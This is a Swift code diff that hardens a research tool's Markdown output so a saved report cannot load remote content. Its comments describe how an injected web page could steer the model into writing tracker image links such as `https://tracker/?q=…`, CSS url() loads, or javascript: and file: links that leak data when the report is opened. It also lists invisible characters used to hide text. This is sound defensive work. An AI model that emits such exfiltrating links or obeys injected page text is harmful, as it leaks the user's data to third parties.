@@ -22,16 +22,53 @@ public enum ResearchText {
         return String(scalars)
     }
 
-    /// Makes Markdown safe to open in a viewer: images become plain links and
-    /// HTML tags that load something become text. A page could otherwise
-    /// steer the model into writing `![x](https://tracker/?q=…)`, which a
-    /// viewer would fetch as soon as the saved report is opened.
+    /// Makes Markdown safe to open in a viewer. A page could otherwise steer
+    /// the model into writing `![x](https://tracker/?q=…)` or HTML such as
+    /// `<div style="background:url(…)">`, which a viewer would fetch as soon
+    /// as the saved report is opened, or a `javascript:` or `file:` link.
+    /// Images become plain links, every `<` is escaped so no HTML or
+    /// autolink is rendered, and links to anything but http and https are
+    /// reduced to their text.
     public static func inertMarkdown(_ text: String) -> String {
-        let withoutImages = text.replacingOccurrences(of: "![", with: "[")
-        let range = NSRange(withoutImages.startIndex..., in: withoutImages)
-        return loadingTag.stringByReplacingMatches(
-            in: withoutImages, range: range, withTemplate: "&lt;$1")
+        var result = text.replacingOccurrences(of: "![", with: "[")
+        result = replacing(linkDefinition, in: result) { label, target in
+            isWebURL(target) ? nil : "\\[\(label)\\]: (link removed)"
+        }
+        result = replacing(inlineLink, in: result) { label, target in
+            isWebURL(target) ? nil : "\(label) (link removed)"
+        }
+        return result.replacingOccurrences(of: "<", with: "\\<")
     }
+
+    static func isWebURL(_ target: String) -> Bool {
+        let lowered = target.lowercased()
+        return lowered.hasPrefix("http://") || lowered.hasPrefix("https://")
+    }
+
+    /// Replaces each match whose (label, target) the closure maps to a string;
+    /// nil keeps the match as it is.
+    private static func replacing(_ expression: NSRegularExpression, in text: String,
+                                  _ replacement: (String, String) -> String?) -> String {
+        let result = NSMutableString(string: text)
+        let matches = expression.matches(in: text, range: NSRange(text.startIndex..., in: text))
+        for match in matches.reversed() {
+            let label = result.substring(with: match.range(at: 1))
+            let target = result.substring(with: match.range(at: 2))
+            if let new = replacement(label, target) {
+                result.replaceCharacters(in: match.range, with: new)
+            }
+        }
+        return result as String
+    }
+
+    /// `[label](target "title")`, with an optional `<target>`.
+    private static let inlineLink = try! NSRegularExpression(
+        pattern: #"\[([^\]\n]*)\]\(\s*<?([^\s)>]*)>?[^)\n]*\)"#)
+
+    /// `[label]: target` at the start of a line.
+    private static let linkDefinition = try! NSRegularExpression(
+        pattern: #"^[ \t]{0,3}\[([^\]\n]+)\]:[ \t]*<?([^\s>]*)>?.*$"#,
+        options: [.anchorsMatchLines])
 
     /// A URL inside Markdown link parentheses: brackets and parentheses are
     /// percent-encoded so the URL cannot end the link early and start another.
@@ -51,11 +88,6 @@ public enum ResearchText {
         return result
     }
 
-    private static let loadingTag = try! NSRegularExpression(
-        pattern: #"<(\s*/?\s*(?:img|image|picture|source|video|audio|iframe|frame|object|embed|"#
-            + #"link|svg|style|script|meta|base|input|form|track)\b)"#,
-        options: [.caseInsensitive])
-
     /// A URL as one printable token: control characters and whitespace removed.
     public static func url(_ text: String) -> String {
         var scalars = String.UnicodeScalarView()
@@ -72,6 +104,10 @@ public enum ResearchText {
         case 0x00...0x1F, 0x7F...0x9F: return true
         case 0x202A...0x202E, 0x2060...0x2069: return true
         case 0xAD, 0x200B...0x200F, 0x2028, 0x2029, 0xFEFF, 0xE0000...0xE007F: return true
+        // More invisible characters used to hide text: the supplementary
+        // variation selectors, fillers and blanks. U+FE0F (emoji) stays.
+        case 0x034F, 0x061C, 0x115F, 0x1160, 0x17B4, 0x17B5, 0x180B...0x180F, 0x2800, 0x3164,
+             0xFFA0, 0xE0100...0xE01EF: return true
         default: return false
         }
     }
